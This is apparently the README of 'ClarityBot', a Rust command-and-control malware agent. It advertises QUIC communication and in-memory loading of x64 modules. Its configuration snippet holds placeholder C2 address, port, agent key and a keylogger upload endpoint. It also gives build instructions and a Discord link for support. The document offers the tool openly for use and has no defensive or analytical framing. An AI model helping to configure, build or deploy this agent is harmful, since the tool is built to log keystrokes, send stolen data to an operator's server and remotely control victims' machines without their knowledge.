# ClarityBot

This repo contains the ClarityBot agent, meant to be used with the server located at https://github.com/lessthen3333/ClarityBot. 

## features
- communication over quic
- load x64 modules in memory

## configuration 

replace the strings bot_lib/src/lib.rs with the relevent varaibles from your configured server.

```
type SharedState = Arc<RwLock<AppState>>;
static resource_url:&str = "http://REPLACE_ME/agt/api/resc/";
static keylogger_url:&str = "http://REPLACE_ME/agt/api/klgr/";
static c2_ip:&str = "REPLACE_ME";
static c2_port:&str = "REPLACE_ME";
static agent_key:&str = "REPLACE_ME";
static agent_id:OnceLock<u32> = OnceLock::new();
```

### build

use either lib.rs or main.rs in app/src or integrate claritybot as a library into your own project.

### discord

join the discord for more development and tech support.
https://discord.gg/P42AuvjT4

### plugs
[![ArmadilloVM](https://armadillovm.com/static/banner.png)](https://armadillovm.com)